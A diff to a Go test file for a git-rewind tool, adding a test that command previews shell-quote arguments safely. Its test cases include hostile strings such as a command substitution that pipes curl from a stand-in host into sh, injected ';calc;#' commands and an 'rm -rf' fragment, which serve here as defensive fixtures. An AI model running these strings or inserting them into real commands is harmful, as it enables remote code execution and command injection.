@@ -16,15 +16,39 @@ import (
 
 func TestPreviewQuotesArguments(t *testing.T) {
 	plan := Plan{Commands: []Command{
+		{Args: []string{"reset", "--hard", "HEAD~1"}},
 		{Args: []string{"reset", "--hard", "HEAD@{1}"}},
-		{Args: []string{"commit", "-m", "two words"}},
+		{Args: []string{"branch", "feature/login-v2", "e205c733abdb3eac0c074db65389c8717ff69f45"}},
 	}}
 	want := []string{
-		"git reset --hard HEAD@{1}",
-		`git commit -m "two words"`,
+		"git reset --hard 'HEAD~1'",
+		"git reset --hard 'HEAD@{1}'",
+		"git branch feature/login-v2 e205c733abdb3eac0c074db65389c8717ff69f45",
 	}
 	if got := plan.Preview(); !reflect.DeepEqual(got, want) {
 		t.Errorf("Preview() = %q, want %q", got, want)
+	}
+}
+
+func TestPreviewNeverLetsAShellExpandAnArgument(t *testing.T) {
+	cases := map[string]string{
+		"two words":                         `'two words'`,
+		"WIP on main: 1a2b3c4 fix `rm -rf`": "'WIP on main: 1a2b3c4 fix `rm -rf`'",
+		"fix-$(curl evil.example|sh)":       "'fix-$(curl evil.example|sh)'",
+		"a;b&c>d":                           "'a;b&c>d'",
+		"$HOME":                             "'$HOME'",
+		"don't":                             `'don'"'"'t'`,
+		"x';calc;#":                         `'x'"'"';calc;#'`,
+		"don’t;calc;#":                      `'don'"’"'t;calc;#'`,
+		"‘a’‚b‛":                            `''"‘"'a'"’"''"‚"'b'"‛"''`,
+		"HEAD^1":                            "'HEAD^1'",
+		"@branch":                           "'@branch'",
+		"":                                  "''",
+	}
+	for arg, want := range cases {
+		if got := quoteArg(arg); got != want {
+			t.Errorf("quoteArg(%q) = %s, want %s", arg, got, want)
+		}
 	}
 }
 
@@ -83,7 +107,7 @@ func TestApplyDryRunChangesNothing(t *testing.T) {
 	if !res.DryRun {
 		t.Error("expected a dry run")
 	}
-	if want := []string{"git reset --hard HEAD~1"}; !reflect.DeepEqual(res.Commands, want) {
+	if want := []string{"git reset --hard 'HEAD~1'"}; !reflect.DeepEqual(res.Commands, want) {
 		t.Errorf("Commands = %q, want %q", res.Commands, want)
 	}
 	if head := revParse(t, git, "HEAD"); head != second {
@@ -124,9 +148,6 @@ func TestApplyExecutesAfterBackup(t *testing.T) {
 	}
 }
 
-// TestApplyNamesTheBackupWhenAPlanFailsPartway is the guard on git-rewind's core promise. A
-// rescue that dies halfway has already created the backup branch, and the user must be told
-// where it is — that is the exact moment they most need to know their work is safe.
 func TestApplyReportsTheBackupWhenAPlanFailsPartway(t *testing.T) {
 	dir, _, _ := twoCommitRepo(t)
 	git := gitexec.New(dir)
